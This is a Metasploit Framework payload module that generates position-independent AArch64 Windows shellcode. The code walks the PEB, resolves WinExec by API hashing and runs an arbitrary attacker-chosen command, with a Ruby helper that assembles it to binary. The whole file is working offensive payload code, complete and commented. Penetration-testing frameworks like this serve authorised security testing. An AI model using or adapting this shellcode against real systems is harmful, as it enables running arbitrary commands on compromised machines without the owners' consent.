##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  # This size is an approximation. The final size depends on the CMD string.
  CachedSize = 384

  include Msf::Payload::Windows
  include Msf::Payload::Single

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows AArch64 Execute Command',
        'Description' => 'Execute an arbitrary command on AArch64 Windows. Based on original research from Alan Foster.',
        'Author' => [
          'alanfoster', # Original implementation and research
          'Alexander "xaitax" Hagenah'
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_AARCH64,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS]
        }
      )
    )

    register_options(
      [
        OptString.new('CMD', [true, 'The command string to execute', 'calc.exe'])
      ]
    )
  end

  def generate(_opts = {})
    # The following AArch64 assembly implements the payload's core logic.
    # It is based on the alanfosters original implementation.
    cmd_str = datastore['CMD'] || 'calc.exe'
    asm = <<~EOF
      // Notes:
      //   https://devblogs.microsoft.com/oldnewthing/20220822-00/?p=107032
      //   https://devblogs.microsoft.com/oldnewthing/20220823-00/?p=107041
      //   https://devblogs.microsoft.com/oldnewthing/20220824-00/?p=107043

      main:
          // --- Function Prologue ---
          // Allocate 0xb0 (176) bytes on the stack, then store the old
          // frame pointer (x29) and link register (x30) at the new stack top.
          stp     x29, x30, [sp, #-0xb0]!
          // Set the new frame pointer to the current stack pointer.
          mov     x29, sp
          // Save non-volatile registers we will be using to a known offset from our new frame.
          stp     x19, x20, [x29, #0x10]
          str     x21, [x29, #0x20]

          // --- API Hash Setup ---
          // Load the pre-calculated custom hash for kernel32.dll!WinExec into w8.
          movz w8, #0x8b31
          movk w8, #0x876f, lsl #16

      api_call:
          // --- PEB Traversal ---
          // Begin walking the Process Environment Block's module list to find loaded DLLs.
          // x18 on Windows AArch64 always points to the Thread Environment Block (TEB).
          ldr x10, [x18, #0x60]      // x10 = TEB->ProcessEnvironmentBlock (PEB)
          ldr x10, [x10, #0x18]      // x10 = PEB->Ldr
          ldr x10, [x10, #0x20]      // x10 = PEB->Ldr.InMemoryOrderModuleList.Flink (first module)

      next_mod:
          // --- Module Name Hashing ---
          // The LDR_DATA_TABLE_ENTRY UNICODE_STRING for the name is at +0x48.
          ldr x11, [x10, #0x50]      // x11 = FullDllName.Buffer pointer
          ldr x12, [x10, #0x4a]      // x12 = FullDllName.Length (USHORT)
          and x12, x12, #0xffff      // Ensure we only have the 16-bit length
          movz w13, #0               // w13 = module hash accumulator
      loop_modname:
          // This hashing loop reads one byte at a time from a UTF-16 string.
          ldrb w14, [x11], #0x1      // Read a byte and post-increment pointer
          cmp w14, #97               // Compare with ASCII 'a' for case conversion
          b.lt not_lowercase
          sub w14, w14, #0x20        // Convert to uppercase
      not_lowercase:
          ror w13, w13, #13          // Rotate hash accumulator
          add w13, w13, w14          // Add character to hash
          sub w12, w12, #1           // Decrement length
          cmp w12, wzr
          b.gt loop_modname
          // These extra rotates are preserved from the original implementation.
          ror w13, w13, #13
          ror w13, w13, #13

          // Save current state to our stack frame before parsing the export table.
          str x10, [x29, #0x30]      // Save current module's LDR_DATA_TABLE_ENTRY pointer
          str x13, [x29, #0x38]      // Save computed module hash

          // --- PE Export Table Traversal ---
          ldr x10, [x10, #0x20]      // x10 = DllBase (module base address)
          ldr w11, [x10, #0x3c]      // Get e_lfanew from DOS header
          add x11, x10, x11          // x11 = Address of PE (NT) Header

          // --- Implement PE64 Magic Number Check ---
          // This check ensures we only attempt to parse 64-bit PE modules,
          // avoiding crashes if a 32-bit (WoW64) module is encountered.
          // The PE32+ Magic (0x020B) is found at Optional Header +0x18.
          ldrh w14, [x11, #0x18]     // Load the Magic number from Optional Header
          cmp w14, #0x020b           // Compare with PE32+ magic value
          b.ne get_next_mod_loop     // If not 0x020B, skip this module (it's 32-bit or invalid)

          ldr w11, [x11, 0x88]       // Get Export Table RVA from Optional Header
          cmp x11, #0x0              // Check if an Export Table exists
          b.eq get_next_mod_loop
          add x11, x11, x10          // x11 = Export Table Virtual Address
          str x11, [x29, #0x40]      // Save EAT address to the stack
          ldr w12, [x11, #0x18]      // w12 = NumberOfNames
          ldr w13, [x11, #0x20]      // w13 = AddressOfNames RVA
          add x13, x10, x13          // w13 = AddressOfNames VA

      get_next_func:
          cmp w12, #0
          b.eq get_next_mod_loop     // If all functions checked, move to the next module
          sub w12, w12, #1           // Search backwards through the export names
          mov x14, #0x4
          madd x15, x12, x14, x13    // Get address of name RVA from AddressOfNames array
          ldr w15, [x15]             // w15 = RVA of function name string
          add x15, x10, x15          // x15 = VA of function name string
          movz x5, #0                // w5 = function hash accumulator
      loop_funcname:
          ldrb w11, [x15], #0x1      // Load one byte of the ASCII function name
          ror w5, w5, #13            // Rotate hash
          add w5, w5, w11            // Add character to hash
          cmp x11, #0
          b.ne loop_funcname         // Loop until null terminator
          ldr w6, [x29, #0x38]       // Retrieve module hash from stack
          add w6, w6, w5             // Add function hash
          cmp w6, w8                 // Compare against target hash
          b.ne get_next_func

      // --- Function Address Resolution ---
      found_func:
          ldr x11, [x29, #0x40]      // Restore EAT address from stack
          ldr w13, [x11, #0x24]      // Get AddressOfNameOrdinals RVA
          add x13, x10, x13
          mov x14, #0x2
          madd x15, x12, x14, x13    // Get address of the function's ordinal
          ldrh w15, [x15]            // Get the 16-bit ordinal
          ldr w13, [x11, #0x1c]      // Get AddressOfFunctions RVA
          add x13, x10, x13
          mov x14, #0x4
          madd x15, x15, x14, x13    // Get address of the function's RVA using the ordinal
          ldr w15, [x15]
          add x15, x15, x10          // x15 = Final VA of WinExec

      finish:
          // --- Call WinExec ---
          // Set up x9 to point to a scratch buffer on our stack for the command string.
          add x9, x29, #0x50
          // create_aarch64_string_in_stack places the pointer to the CMD in x0.
          #{create_aarch64_string_in_stack(cmd_str)}
          mov w1, #1                 // Arg2: uCmdShow = SW_SHOWNORMAL (1)
          mov x8, x15                // Move target function address for the call
          blr x8                     // Branch with Link to Register (call WinExec)

      // --- Function Epilogue ---
      epilogue:
          // Restore saved registers.
          ldp     x19, x20, [x29, #0x10]
          ldr     x21, [x29, #0x20]
          // Restore the original stack pointer from our frame pointer.
          mov     sp, x29
          // Restore the original frame pointer and link register, deallocating the stack.
          ldp     x29, x30, [sp], #0xb0
          ret                        // Return to the caller.

      // --- Refined Loop Control ---
      get_next_mod_loop:
          // Restore the LDR_DATA_TABLE_ENTRY pointer from the stack.
          ldr x10, [x29, #0x30]
          // Follow the Flink pointer to the next entry in the circular list.
          ldr x10, [x10]
          // Jump back to the start of the module processing loop.
          b next_mod
    EOF

    compile_aarch64(asm)
  end

  def create_aarch64_string_in_stack(string)
    str = string + "\x00"
    target = :x0
    stack = :x9
    push_string = str.bytes.each_slice(8).flat_map do |chunk|
      mov_instructions = chunk.each_slice(2).with_index.map do |word, idx|
        hex = word.reverse.map { |b| format('%02x', b) }.join
        "mov#{idx == 0 ? 'z' : 'k'} #{target}, #0x#{hex}#{idx == 0 ? '' : ", lsl ##{idx * 16}"}"
      end
      [*mov_instructions, "str #{target}, [#{stack}], #8"]
    end
    set_target_register = [
      "mov #{target}, #{stack}",
      "sub #{target}, #{target}, ##{align(str.bytesize)}"
    ]
    (push_string + set_target_register).join("\n")
  end

  def align(value, alignment: 8)
    return value if (value % alignment).zero?

    value + (alignment - (value % alignment))
  end

  def compile_aarch64(asm_string)
    require 'aarch64/parser'
    parser = ::AArch64::Parser.new
    asm = parser.parse(without_inline_comments(asm_string))
    asm.to_binary
  end

  def without_inline_comments(string)
    string.lines.map { |line| line.split('//', 2).first.strip }.reject(&:empty?).join("\n")
  end
end
